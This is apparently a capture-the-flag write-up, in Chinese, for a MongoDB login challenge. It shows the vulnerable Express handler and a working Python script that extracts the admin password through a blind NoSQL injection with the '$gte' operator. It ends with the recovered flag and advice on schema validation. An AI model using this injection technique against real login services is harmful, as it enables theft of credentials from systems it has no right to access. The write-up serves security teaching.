# Sql Bad

## 题目简述

Express 服务接收 JSON 登录数据，并把 `username`、`password` 原样放入 MongoDB 查询：

```javascript
app.post("/", async (req, res) => {
    const { username, password } = req.body;
    const user = await req.app.locals.db.findOne({ username, password });
    res.status(user ? 200 : 401).json({
        message: user ? "Login successful" : "Invalid username or password",
    });
});
```

管理员密码本身就是 Flag。由于服务没有验证 `password` 必须是字符串，攻击者可以传入 MongoDB 查询运算符，构造布尔 Oracle 并逐字符恢复密码。

## 解题过程

固定用户名为 `admin`，把密码字段改为：

```json
{"$gte": "greyhats{a"}
```

若真实密码按 MongoDB 字符串排序大于等于候选前缀，`findOne` 返回管理员记录并响应 `Login successful`；否则返回 401。对每个位置在可打印 ASCII 范围二分：

```python
import requests

url = "http://HOST/"
prefix = ""

def ge(candidate):
    response = requests.post(
        url,
        json={"username": "admin", "password": {"$gte": candidate}},
    )
    return response.status_code == 200

while not prefix.endswith("}"):
    lo, hi = 32, 126
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if ge(prefix + chr(mid)):
            lo = mid
        else:
            hi = mid - 1
    prefix += chr(lo)
    print(prefix)
```

最终恢复：

```text
greyhats{n0sq1_sti11_c4n_1nj3ct!}
```

## 方法总结

- 核心技巧：把 JSON 字符串字段替换为 MongoDB 比较运算符，利用登录成功与否构造字典序盲注。
- 识别信号：Express 开启 JSON 解析，用户对象直接传给 `findOne`，没有类型校验或运算符清理。
- 复用要点：NoSQL 并不意味着没有注入；应使用严格 Schema，拒绝对象型凭据并对查询运算符做边界控制。
